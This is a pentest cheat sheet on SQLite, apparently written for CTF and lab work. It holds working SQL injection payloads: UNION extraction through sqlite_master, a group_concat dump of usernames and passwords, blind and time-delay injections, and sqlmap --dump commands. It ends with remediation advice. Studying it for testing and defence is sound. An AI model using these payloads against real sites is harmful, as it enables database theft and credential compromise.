# SQLite in web exploitation

SQLite is a file-based database (`.db`, `.sqlite`, `.sqlite3`) common in small
apps - Node/Express, Flask, PHP. Two angles matter on a box: **reading the DB
file** once you have any file/command primitive, and **SQL injection** against a
SQLite-backed endpoint.

## Reading a SQLite DB you have grabbed

```bash
file utech.db.sqlite               # confirm: "SQLite 3.x database"
sqlite3 utech.db.sqlite            # interactive
```

```sql
.tables                 -- list tables
.schema                 -- full schema (CREATE statements)
.schema users           -- one table
SELECT * FROM users;
.dump                   -- dump everything as SQL
.headers on
.mode column
```

No `sqlite3` binary? Read it anyway:

```bash
strings utech.db.sqlite | less          # creds/hashes are stored as plain text
python3 -c "import sqlite3;c=sqlite3.connect('utech.db.sqlite');[print(r) for r in c.execute('SELECT * FROM users')]"
```

> On UltraTech the app DB `utech.db.sqlite` held `r00t` and `admin` with MD5
> hashes - grabbed via command injection, cracked with hashcat.

## SQL injection against SQLite

### Detect

```
' OR 1=1--
" OR "1"="1
1' AND '1'='1     (true)   vs   1' AND '1'='2   (false)
```

Comment styles: `--` (needs a trailing space in some parsers), `/* */`.

### Fingerprint that it is SQLite

```sql
' AND sqlite_version()>'0                       -- no error = works
' UNION SELECT sqlite_version(),NULL--
```

`sqlite_version()` exists only in SQLite; MySQL uses `version()`, so this
distinguishes the backend.

### UNION-based extraction

```sql
-- 1. find the column count (increment until no error)
' ORDER BY 3--
-- 2. find which columns echo back
' UNION SELECT 1,2,3--
-- 3. list tables from the schema (SQLite has no information_schema)
' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--
-- 4. get a table's CREATE statement to learn its columns
' UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='users'--
-- 5. dump data (group_concat to pull many rows into one field)
' UNION SELECT 1,group_concat(username||':'||password,'\n'),3 FROM users--
```

Key SQLite specifics vs MySQL:
- Schema catalogue is **`sqlite_master`** (columns: `type,name,tbl_name,sql`),
  not `information_schema.tables`.
- String concatenation is **`||`**, not `CONCAT()`.
- `limit N offset M` for row-by-row extraction.

### Blind / boolean & time

SQLite has no `SLEEP()`. Force time with a heavy computation or many blobs:

```sql
' AND 1=(SELECT 1 FROM ... )                     -- boolean blind as usual
' AND substr((SELECT password FROM users LIMIT 1),1,1)='a'--
-- time delay hack:
' AND 1=like('ABCDEFG',upper(hex(randomblob(100000000))))--
```

### RCE / file angles

- **`sqlite3` CLI attach/ATTACH DATABASE** can write files in some setups, and
  `load_extension()` loads a shared library if enabled (usually disabled) - rare
  but worth noting for a report.
- More often the payoff is reading credentials from the DB, then reusing them on
  SSH/other services.

## Tooling

```bash
sqlmap -u 'http://$IP/item?id=1' --batch --dbms=sqlite --dump
sqlmap -r request.txt --batch --level 3 --risk 2
```

## Remediation (for the report)

- Parameterised queries / prepared statements - never string-concatenate input.
- Store the DB outside the web root; strong password hashing (bcrypt/argon2,
  never MD5).
- Disable `load_extension`; least-privilege the app user.

## References

- PayloadsAllTheThings - SQLi (SQLite): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
- PortSwigger - SQL injection: https://portswigger.net/web-security/sql-injection
- SQLite docs - sqlite_master / built-ins: https://www.sqlite.org/schematab.html
